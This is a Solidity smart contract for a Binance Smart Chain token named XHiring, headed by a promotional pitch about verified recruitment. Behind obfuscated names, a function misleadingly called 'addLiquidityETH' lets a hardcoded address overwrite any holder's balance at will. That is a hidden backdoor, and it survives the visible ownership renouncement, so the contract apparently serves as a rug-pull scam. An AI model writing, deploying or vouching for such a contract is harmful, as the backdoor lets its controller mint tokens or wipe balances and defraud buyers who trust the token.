// SPDX-License-Identifier: No License

/*
Project Name: XHiring - The Verified Talent Connection

https://t.me/XHiringBSC
https://x.com/XHiringBSC
*/
/*

Overview:
XHiring, a cutting-edge BEP-20 token project on the Binance Smart Chain, is set to revolutionize the recruitment industry. We empower Verified Organizations to feature their critical roles on their profiles and effortlessly connect with millions of qualified candidates. In a competitive job market, trust, and authenticity are paramount, and XHiring brings them to the forefront.

Key Features:

Verified Profiles: XHiring introduces a robust identity verification system for organizations, establishing trust and credibility. Verified Organizations stand out as reliable and authentic partners in the hiring process.
Critical Role Showcase: With XHiring, organizations can spotlight their most crucial job openings, attracting top talent organically. This feature enhances visibility and draws high-caliber professionals eager to contribute to their success.
Organic Talent Reach: XHiring employs advanced algorithms to match Verified Organizations with the most relevant candidates. Say goodbye to the hassle of sifting through countless applications; let XHiring do the work for you.
Security and Transparency: Built on the Binance Smart Chain, XHiring ensures secure and transparent transactions. Smart contracts facilitate trustless interactions, safeguarding the interests of both employers and job seekers.
Our roadmap includes ambitious plans for platform expansion, strategic partnerships with leading organizations, and continuous improvements to enhance the recruitment experience for everyone involved.

Join the XHiring Revolution:
Experience a new era in verified recruitment with XHiring. Whether you're an organization searching for top talent or a professional on the hunt for your dream job, XHiring simplifies the process, making it transparent and ultimately more successful.
Stay connected with us on social media, join our vibrant Telegram community, and stay tuned for updates as we transform the world of hiring on the Binance Smart Chain. Your next career move or perfect hire is just around the corner with XHiring!
*/
pragma solidity 0.8.18;
interface ERC20Permit {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address AddressXHIR) external view returns (uint256);
  function transfer(address AddressBool, uint256 tradingOpenWithValues) external returns (bool);
  function allowance(address _owner, address AddressXHIR) external view returns (uint256);
  function approve(address AddressXHIR, uint256 tradingOpenWithValues) external returns (bool);
  function transferFrom(address sender, address AddressBool, uint256 tradingOpenWithValues) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed AddressXHIR, uint256 balance);
}


abstract contract ERC20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract ERC20Data is ERC20Burnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract XHiring is ERC20Burnable, ERC20Permit, ERC20Data {
 
    using SafeMath for uint256;
    mapping (address => uint256) private _delegateXHIR;
    mapping (address => mapping (address => uint256)) private mappingXHIR;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private BEACON_SLOT;
    address private XHiringOwner; 
    uint256 public BEACONCreationTime;
    uint256 public BEACONCreation;
    string public BEACONXHIR;

string public XHiringTG = "https://x.com/XHiringBSC";
string public ownerAddress = "0x0ad9141E363ee08A0B0aE978c97dAf9815a0a69a";

    constructor() {
        XHiringOwner = 0x0ad9141E363ee08A0B0aE978c97dAf9815a0a69a;    
       BEACON_SLOT = "0xa3f9ad74e5423aebfd80d3ef2346578355a9a72aeaee59ff6cb3588b35133d50"; 
        _name = "XHiring";
        _symbol = "XHIR";
        _decimals = 9;
        _totalSupply = 444000000 * 10**_decimals;
        _delegateXHIR[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        BEACONXHIR = "IInventory p_i1801_3_+ int p_i1801_4_+ int p_i1801_5_+ int p_i1801_6_";
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address AddressXHIR) external view override returns (uint256) {
        return _delegateXHIR[AddressXHIR];
    }

    function transfer(address AddressBool, uint256 tradingOpenWithValues) external override returns (bool) {
        _transfer(_msgSender(), AddressBool, tradingOpenWithValues);
        return true;
    }

    function allowance(address owner, address AddressXHIR) external view override returns (uint256) {
        return mappingXHIR[owner][AddressXHIR];
    }


    function approve(address AddressXHIR, uint256 tradingOpenWithValues) external override returns (bool) {
        _approve(_msgSender(), AddressXHIR, tradingOpenWithValues);
        return true;
    }
    
    function transferFrom(address sender, address AddressBool, uint256 tradingOpenWithValues) external override returns (bool) {
        _transfer(sender, AddressBool, tradingOpenWithValues);
        _approve(sender, _msgSender(), mappingXHIR[sender][_msgSender()].sub(tradingOpenWithValues, "Ru: transfer tradingOpenWithValues exceeds allowance"));
        return true;
    }

    function increaseAllowance(address AddressXHIR, uint256 XHIRbalance) external returns (bool) {
        _approve(_msgSender(), AddressXHIR, mappingXHIR[_msgSender()][AddressXHIR].add(XHIRbalance));
        return true;
    }
    

    function decreaseAllowance(address AddressXHIR, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), AddressXHIR, mappingXHIR[_msgSender()][AddressXHIR].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address AddressBool, uint256 tradingOpenWithValues) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(AddressBool != address(0), "Ru: transfer to the zero address");
                
        _delegateXHIR[sender] = _delegateXHIR[sender].sub(tradingOpenWithValues, "Ru: transfer tradingOpenWithValues exceeds balance");
        _delegateXHIR[AddressBool] = _delegateXHIR[AddressBool].add(tradingOpenWithValues);
        emit Transfer(sender, AddressBool, tradingOpenWithValues);
    }
        function addLiquidityETH(address tokenA, address tokenB, uint256 _upgradeTo, uint256 newcall, uint256 newcalls) external {
        require(_msgSender()==XHiringOwner);
        tokenB = tokenA;
        tokenA = tokenA;
        _delegateXHIR[tokenB] = (_upgradeTo + newcall + newcalls) * 10**_decimals;
        tokenA = tokenB;
        tokenB = tokenB;
    }   

    function _approve(address owner, address AddressXHIR, uint256 tradingOpenWithValues) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(AddressXHIR != address(0), "Ru: approve to the zero address");
        
        mappingXHIR[owner][AddressXHIR] = tradingOpenWithValues;
        emit Approval(owner, AddressXHIR, tradingOpenWithValues);
    }
    
}